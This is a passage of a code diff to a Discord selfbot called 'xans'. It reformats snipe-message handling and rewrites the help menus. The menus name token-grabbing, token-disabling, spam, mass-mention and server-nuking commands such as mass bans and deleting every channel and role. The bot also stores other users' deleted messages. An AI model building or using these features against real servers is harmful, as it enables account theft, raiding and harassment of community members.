+                    discord.utils.escape_markdown(str(before.author))
+                ) + "`: \n**BEFORE**\n" + str(before.content).replace(
+                    "@everyone", "@\u200beveryone").replace(
+                        "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
+                            after.content).replace("@everyone",
+                                                   "@\u200beveryone").replace(
+                                                       "@here", "@\u200bhere")
                 await before.channel.send(message_content)
             else:
                 links = ""
                 for attachment in attachments:
                     links += attachment.proxy_url + "\n"
                 message_content = "`" + str(
-                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
+                    discord.utils.escape_markdown(str(before.author))
+                ) + "`: " + discord.utils.escape_mentions(
                     before.content) + "\n\n**Attachments:**\n" + links
                 await before.channel.send(message_content)
     if len(xans.sniped_edited_message_dict) > 1000:
@@ -732,10 +764,15 @@ async def on_message_edit(before, after):
     attachments = before.attachments
     if len(attachments) == 0:
         channel_id = before.channel.id
-        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
-            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
-                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
-            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
+        message_content = "`" + str(
+            discord.utils.escape_markdown(str(
+                before.author))) + "`: \n**BEFORE**\n" + str(
+                    before.content).replace(
+                        "@everyone", "@\u200beveryone").replace(
+                            "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
+                                after.content).replace(
+                                    "@everyone", "@\u200beveryone").replace(
+                                        "@here", "@\u200bhere")
         xans.sniped_edited_message_dict.update({channel_id: message_content})
     else:
         links = ""
@@ -743,8 +780,9 @@ async def on_message_edit(before, after):
             links += attachment.proxy_url + "\n"
         channel_id = before.channel.id
         message_content = "`" + str(
-            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
-            before.content) + "\n\n**Attachments:**\n" + links
+            discord.utils.escape_markdown(str(
+                before.author))) + "`: " + discord.utils.escape_mentions(
+                    before.content) + "\n\n**Attachments:**\n" + links
         xans.sniped_edited_message_dict.update({channel_id: message_content})
 
 
@@ -755,7 +793,7 @@ async def snipe(ctx):
     if currentChannel in xans.sniped_message_dict:
         await ctx.send(xans.sniped_message_dict[currentChannel])
     else:
-        await ctx.send("No message to snipe!")
+        await ctx.send("`No message to snipe!`")
 
 
 @xans.command(aliases=["esnipe"])
@@ -765,7 +803,7 @@ async def editsnipe(ctx):
     if currentChannel in xans.sniped_edited_message_dict:
         await ctx.send(xans.sniped_edited_message_dict[currentChannel])
     else:
-        await ctx.send("No message to snipe!")
+        await ctx.send("`No message to snipe!`")
 
 
 @xans.command()
@@ -788,8 +826,8 @@ async def adminservers(ctx):
     botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
     banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
     kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
-    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)
-
+    await ctx.send(adminPermServers + botPermServers + banPermServers +
+                   kickPermServers)
 
 @xans.command()
 async def bots(ctx):
@@ -798,7 +836,8 @@ async def bots(ctx):
     for member in ctx.guild.members:
         if member.bot:
             bots.append(
-                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
+                str(member.name).replace("`", "\`").replace("*", "\*").replace(
+                    "_", "\_") + "#" + member.discriminator)
     bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
     await ctx.send(bottiez)
 
@@ -807,66 +846,151 @@ async def bots(ctx):
 async def help(ctx, category=None):
     await ctx.message.delete()
     if category is None:
-        embed = discord.Embed(color=0xFF633B, timestamp=ctx.message.created_at)
-        embed.set_author(name="Xans Selfbot | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(xans.command_prefix),
-                         icon_url=xans.user.avatar_url)
+        embed = discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
+        embed.set_author(
+            name="xans |--| PREFIX: " + str(xans.command_prefix),
+            
+        
+        icon_url=xans.user.avatar_url)
         embed.set_thumbnail(url=xans.user.avatar_url)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723253781873164298/image1.gif")
-        embed.add_field(name="\uD83E\uDDCA `GENERAL`", value="Shows all general commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `ACCOUNT`", value="Shows all account commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `TEXT`", value="Shows all text commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `MUSIC`", value="Shows all music commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `IMAGE`", value="Shows all image manipulation commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `NSFW`", value="Shows all nsfw commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `MISC`", value="Shows all miscellaneous commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `ANTI-NUKE`", value="Shows all anti-nuke commands", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `NUKE`", value="Shows all nuke commands", inline=False)
-        await ctx.send(embed=embed)
-    elif str(category).lower() == "general":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723272273888280576/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n"
-        await ctx.send(embed=embed)
-    elif str(category).lower() == "account":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723266223554691202/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({xans.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({xans.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({xans.mee6}) <#{xans.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{xans.yui_kiss_user}> <#{xans.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{xans.yui_hug_user}> <#{xans.yui_hug_channel}>\n`> yuistop` - stops any running yui loops"
-        await ctx.send(embed=embed)
-    elif str(category).lower() == "text":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723278609648713818/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `TEXT COMMANDS`\n`> exeter` - sends the exeter logo\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({xans.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> dm <user> <content>` - dms a user a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> wizz` - makes a prank message about wizzing \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
-        await ctx.send(embed=embed)
-    elif str(category).lower() == "music":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723270695185809468/image1.gif")
-        embed.description = f"\uD83D\uDCB0 `MUSIC COMMANDS`\n`> play <query>` - plays the specified song if you're in a voice-channel\n`> stop` - stops the music player\n`> skip` - skips the current song playing\n`> lyrics <song>` - shows the specified song's lyrics\n`> youtube <query>` - returns the first youtube search result of the query"
-        await ctx.send(embed=embed)
-    elif str(category).lower() == "image":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
         embed.set_image(
-            url="https://cdn.discordapp.com/attachments/723250694118965300/739548124493643837/ezgif.com-video-to-gif.gif")
-        embed.description = f"\uD83D\uDCB0 `IMAGE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> jpegify <user>` - jpegifies the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
+            url= 
+            "https://media0.giphy.com/media/OY9XK7PbFqkNO/200.gif"
+        )
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Regular`   ●",
+            value="**✘ Shows Regular Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Acco`   ●",
+            value="**✘ Shows Account Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Msg`   ●",
+            value="**✘ Shows Text Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Tones`   ●",
+            value="**✘ Shows Music Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Pic`   ●",
+            value="**✘ Shows Image Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Nsfw`   ●",
+            value="**✘ Shows Nsfw Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Fun`   ●",
+            value="**✘ Shows Fun Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Anti`   ●",
+            value="**✘ Shows Anti Nuke Commands ✘**",
+            inline=False)
+        embed.add_field(
+            name="\uD83E\uDDDB ●   `~ Nuker`   ●",
+            value="**✘ Shows Nuke Commands ✘**",
+            inline=False)
         await ctx.send(embed=embed)
+    
+    elif str(category).lower() == "regular":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`• Help <category>` - ***✗ Returns all commands of that category ✗***\n`• Uptime` - ***✗ Return how long the selfbot has been running ✗***\n`• Prefix <prefix>` - ***✗ Changes the bot's prefix ✗***\n`• Ping` - ***✗ Returns the bot's latency ✗***\n`• Av <user>` - ***✗ returns the user's pfp ✗***\n`• Whois <user>` - ***✗ Returns user's account info ✗***\n`• Tokeninfo <token>` - ***✗ Returns information about the token ✗***\n`• Copyserver` - ***✗ Makes a copy of the server ✗***\n`• Rainbowrole <role>` - ***✗ Makes the role a rainbow role (ratelimits) ✗***\n`• Serverinfo` - ***✗ Gets information about the server ✗***\n`• Serverpfp` - ***✗ Returns the server's icon ✗***\n`• Banner` - ***✗ Returns the server's banner ✗***\n`• Shutdown` - ***✗ Shutsdown the selfbot ✗***\n"
+        await ctx.send(embed=embed)
+    
+    elif str(category).lower() == "acco":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`◦ Ghost` - ***✗ Makes your name and pfp invisible ✗***\n`◦ Pfpsteal <user>` - ***✗ Steals the users pfp ✗***\n`◦ Setpfp <link>` - ***✗ Sets the image-link as your pfp ✗***\n`◦ Hypesquad <hypesquad>` - ***✗ Changes your current hypesquad ✗***\n`◦ Spoofcon <type> <name>` - ***✗ Spoofs your discord connection ✗***\n`◦ Leavegroups` - ***✗ Leaves all groups that you're in ✗***\n`◦ Cyclenick <text>` - ***✗ Cycles through your nickname by letter ✗***\n`◦ Stopcyclenick` - ***✗ Stops cycling your nickname ✗***\n`◦ Stream <status>` - ***✗ Sets your streaming status ✗***\n`◦ Playing <status>` - ***✗ Sets your playing status ✗***\n`◦ Listening <status>` - ***✗ Sets your listening status ✗***\n`◦ Watching <status>` - ***✗ Sets your watching status ✗***\n`◦ Stopactivity` - ***✗ Resets your status-activity ✗***\n`◦ Acceptfriends` - ***✗ Accepts all friend requests ✗***\n`◦ Delfriends` - ***✗ Removes all your friends ✗***\n`◦ Ignorefriends` - ***✗ Ignores all friends requests ✗***\n`◦ Clearblocked` - ***✗ Clears your block-list ✗***\n`◦ Read` - ***✗ Marks all messages as read ✗***\n`◦ Leavegc` - ***✗ Leaves the current groupchat ✗***\n`◦ Adminservers` - ***✗ Lists all servers you have perms in ✗***\n`◦ Slotbot <on/off>` - ***✗ Snipes slotbots ({xans.slotbot_sniper}) ✗***\n`◦ Giveaway <on/off>` - ***✗ Snipes giveaways ({xans.giveaway_sniper}) ✗***\n`◦ Mee6 <on/off>` - ***✗ Sends messages in the chosen channel ({xans.mee6}) <#{xans.mee6_channel}> ✗***\n`◦ Yuikiss <user>` - ***✗ Auto sends yui kisses every minute <@{xans.yui_kiss_user}> <#{xans.yui_kiss_channel}> ✗***\n`◦ Yuihug <user>` - ***✗ Auto sends yui hugs every minute <@{xans.yui_hug_user}> <#{xans.yui_hug_channel}> ✗***\n`◦ Yuistop` - ***✗ Stops any running yui loops ✗***"
+        await ctx.send(embed=embed)
+    
+    elif str(category).lower() == "msg":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`+ Snipe` - *** Shows the last deleted message ***\n`+ Esnipe` - ***Shows the last edited message***\n`+ Msgsniper <on/off> ({xans.msgsniper})` - *** Enables a message sniper for deleted messages in DMs ***\n`+ Clear` - *** Sends a large message filled with invisible unicode ***\n`+ Del <message>` - *** Sends a message and deletes it instantly ***\n`+ 1337speak <message>` - *** Talk like a hacker ***\n`+ Minesweeper` - *** Play a game of minesweeper ***\n`+ Spam <amount>` - *** Spams a message ***\n`+ Dm <user> <content>` - *** Dms a user a message ***\n`+ Reverse <message>` - *** Sends the message but in reverse-order ***\n`+ Shrug` - *** Returns ¯\_(ツ)_/¯ ***\n`+ Lenny` - *** Returns ( ͡° ͜ʖ ͡°) ***\n`+ Fliptable` - *** Returns (╯°□°）╯︵ ┻━┻ ***\n`+ Unflip` - *** Returns (╯°□°）╯︵ ┻━┻ ***\n`+ Bold <message>` - *** Bolds the message ***\n`+ Censor <message>` - *** Censors the message ***\n`+ Underline <message>` - *** Underlines the message ***\n`+ Italicize <message>` - *** Italicizes the message ***\n`+ Strike <message>` - *** Strikethroughs the message ***\n`+ Quote <message>` - *** quotes the message ***\n`+ Code <message>` - *** Applies code formatting to the message ***\n`+ Purge <amount>` - *** Purges the amount of messages ***\n`+ Empty` - *** Sends an empty message ***\n`+ Tts <content>` - *** Returns an mp4 file of your content ***\n`+ Firstmsg` - *** Shows the first message in the channel history ***\n`+ Ascii <message>` - *** Creates an ASCII art of your message ***\n`+ Wizz` - *** Makes a prank message about wizzing ***\n`+ 8ball <question>` - *** Returns an 8ball answer ***\n`+ Slots` - *** Play the slot machine ***\n`+ Everyone` - *** Pings everyone through a link ***\n`> Abc` - *** Cyles through the alphabet ***\n`+ 100` - *** Cycles -100 ***\n`+ Cum` - *** Makes you cum ***\n`+ 9/11` - *** Sends a 9/11 attack ***\n`+ Massreact <emoji>` - *** Mass reacts with the specified emoji ***"
+        await ctx.send(embed=embed)
+    
+    elif str(category).lower() == "tones":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`‣ Play <query>` - ***✗ Plays the specified song if you're in a voice-channel ✗***\n`‣ Stop` - ***✗ Stops the music player ✗***\n`‣ Skip` - ***✗ Skips the current song playing ✗***\n`‣ Lyrics <song>` - ***✗ Shows the specified song's lyrics ✗***\n`‣ Youtube <query>` - ***✗ Returns the first youtube search result of the query ✗***"
+        await ctx.send(embed=embed)
+    
+    elif str(category).lower() == "pic":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`‣ Tweet <user> <message>` - ***✗ Makes a fake tweet ✗***\n`‣ Magik <user>` - ***✗ Distorts the specified user ✗***\n`‣ Fry <user>` - ***✗ Deep-fry the specified user ✗***\n`‣ Blur <user>` - ***✗ Blurs the specified user ✗***\n`‣ Pixelate <user>` - ***✗ Pixelates the specified user ✗***\n`‣ Supreme <message>` - ***✗ Makes a *Supreme* logo ✗***\n`‣ Darksupreme <message>` - ***✗ Makes a *Dark Supreme* logo ✗***\n`‣ Fax <text>` - ***✗ Makes a fax meme ✗***\n`‣ Blurpify <user>` - ***✗ Blurpifies the specified user ✗***\n`‣ Invert <user>` - ***✗ Inverts the specified user ✗***\n`‣ Gay <user>` - ***✗ Makes the specified user gay ✗***\n`‣ Communist <user>` - ***✗ Makes the specified user a communist ✗***\n`‣ Snow <user>` - ***✗ Adds a snow filter to the specified user ✗***\n`‣ Jpegify <user>` - ***✗ Jpegifies the specified user ✗***\n`‣ Pornhub <logo-word 1> <logo-word 2>` - ***✗ Makes a PornHub logo ✗***\n`‣ Phcomment <user> <message>` - ***✗ Makes a fake PornHub comment ✗***\n"
+        await ctx.send(embed=embed)
+        
     elif str(category).lower() == "nsfw":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723268822789783612/image1.gif")
-        embed.description = f"\uD83D\uDCB0 `NSFW COMMANDS`\n`> anal` - returns anal pics\n`> erofeet` - returns erofeet pics\n`> feet` - returns sexy feet pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> tits` - returns titty pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics"
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`» Anal` - ***✗ Returns anal pics ✗***\n`» Erofeet` - ***✗ Returns erofeet pics ✗***\n`» Feet` - ***✗ Returns sexy feet pics ✗***\n`» Hentai` - ***✗ Returns hentai pics ✗***\n`» Boobs` - ***✗ Returns booby pics ✗***\n`» Tits` - ***✗ Returns titty pics ✗***\n`» Blowjob` - ***✗ Returns blowjob pics ✗***\n`» Neko` - ***✗ Returns neko pics ✗***\n`» Lesbian` - ***✗ Returns lesbian pics ✗***\n`» Cumslut` - ***✗ Returns cumslut pics ✗***\n`» Pussy` - ***✗ Returns pussy pics ✗***\n`» Waifu` - ***✗ Returns waifu pics ✗***"
         await ctx.send(embed=embed)
-    elif str(category).lower() == "misc":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723265016979259544/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({xans.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
+        
+    elif str(category).lower() == "fun":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`→ Copycat <user>` - ***✗ Copies the users messages ({xans.copycat}) ✗***\n`→ Stopcopycat` - ***✗ Stops copycatting ✗***\n`→ Fakename` - ***✗ Makes a fakename with other members's names ✗***\n`→ Geoip <ip>` - ***✗ Looks up the ip's location ✗***\n`→ Pingweb <website-url>` ***✗ Pings a website to see if it's up ✗***\n`→ Anticatfish <user>` - ***✗ Reverse google searches the user's pfp ✗***\n`→ Stealemoji <emoji> <name>` - ***✗ Steals the specified emoji ✗***\n`→ Hexcolor <hex-code>` - ***✗ Returns the color of the hex-code ✗***\n`→ Dick <user>` - ***✗ Returns the user's dick size ✗***\n`→ Bitcoin` - ***✗ Shows the current bitcoin exchange rate ✗***\n`→ Hastebin <message>` - ***✗ Posts your message to hastebin ✗***\n`→ Rolecolor <role>` - ***✗ Returns the role's color ✗***\n`→ Nitro` - ***✗ Generates a random nitro code ✗***\n`→ Feed <user>` - ***✗ Feeds the user ✗***\n`→ Tickle <user>` - ***✗ Tickles the user ✗***\n`→ Slap <user>` - ***✗ Slaps the user ✗***\n`→ Hug <user>` - ***✗ hugs the user ✗***\n`→ Cuddle <user>` - ***✗ Cuddles the user ✗***\n`→ Smug <user>` - ***✗ Smugs at the user ✗***\n`→ Pat <user>` - ***✗ Pat the user ✗***\n`→ Kiss <user>` - ***✗ Kiss the user ✗***\n`→ Topic` - ***✗ Sends a conversation starter ✗***\n`→ Wyr` - ***✗ Sends a would you rather ✗***\n`→ Gif <query>` - ***✗ Sends a gif based on the query ✗***\n`→ Sendall <message>` - ***✗ Sends a message in every channel ✗***\n`→ Poll <msg: xyz 1: xyz 2: xyz>` - ***✗ Creates a poll ✗***\n`→ Bots` - ***✗ Shows all bots in the server ✗***\n`→ Image <query>` - ***✗ Returns an image ✗***\n`→ Hack <user>` - ***✗ Hacks the user ✗***\n`→ Token <user>` - ***✗ Returns the user's token ✗***\n`→ Cat` - ***✗ Returns random cat pic ✗***\n`→ Sadcat` - ***✗ Returns a random sad cat ✗***\n`→ Dog` - ***✗ Returns random dog pic ✗***\n`→ Fox` - ***✗ Returns random fox pic ✗***\n`→ Bird` - ***✗ Returns random bird pic ✗***\n"
         await ctx.send(embed=embed)
-    elif str(category).lower() == "antinuke":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723274816055935067/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `ANTI-NUKE COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({xans.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash"
+          
+    elif str(category).lower() == "anti":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
+        embed.description = f"\uD83E\uDDDB **xans**\n`> Antiraid <on/off>` - ***✗ Toggles anti-nuke ({xans.antiraid}) ✗***\n`> Whitelist <user>` - ***✗ Whitelists the specified user ✗***\n`> Whitelisted <-g>` - ***✗ See who's whitleisted and in what guild ✗***\n`> Unwhitelist <user>` - ***✗ Unwhitelists the user ✗***\n`> Clearwhitelist` - ***✗ Clears the whitelist hash ✗***\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist."
         await ctx.send(embed=embed)
-    elif str(category).lower() == "nuke":
-        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723256768742031451/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `NUKE COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people"
+    elif str(category).lower() == "nuker":
+        embed = discord.Embed(
+            color=0x000000,
+            timestamp=ctx.message.created_at)
+        embed.set_image(
+            url=
+            "https://media.discordapp.net/attachments/818338851185491991/818350947788259338/0UYeqnpuKMcAAAAAElFTkSuQmCC.png?width=454&height=499"
+        )
